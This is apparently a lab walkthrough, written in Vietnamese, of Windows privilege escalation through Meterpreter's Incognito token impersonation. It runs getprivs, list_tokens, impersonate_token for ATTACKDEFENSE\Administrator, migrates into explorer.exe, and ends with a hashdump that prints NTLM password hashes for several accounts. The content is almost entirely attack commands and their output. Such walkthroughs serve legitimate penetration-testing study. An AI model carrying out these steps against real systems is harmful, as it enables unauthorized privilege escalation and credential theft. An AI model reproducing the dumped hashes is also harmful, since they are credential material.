# Windows Privilege Escalation: Token Impersonation With Incognito

Sau khi có phiên meterpreter

`getuid`

	Server username: NT AUTHORITY\LOCAL SERVICE
	
`getprivs`

    Enabled Process Privileges
    ==========================
    Name
    ----
    SeAssignPrimaryTokenPrivilege
    SeAuditPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeImpersonatePrivilege # Token Impersonation can be performed
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeSystemtimePrivilege
    SeTimeZonePrivilege


**Privilege Escalation**

`load incognito`

`list_tokens -u`

    Delegation Tokens Available
    ========================================
    ATTACKDEFENSE\Administrator
    NT AUTHORITY\LOCAL SERVICE

    Impersonation Tokens Available
    ========================================
    No tokens available

`ATTACKDEFENSE\Administrator` token sẽ cung cấp các đặc quyền cao hơn.

`impersonate_token "ATTACKDEFENSE\Administrator"`

`getuid`

	Server username: ATTACKDEFENSE\Administrator

`ps`

`migrate 3548` # explorer.exe

`hashdump`

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::`




























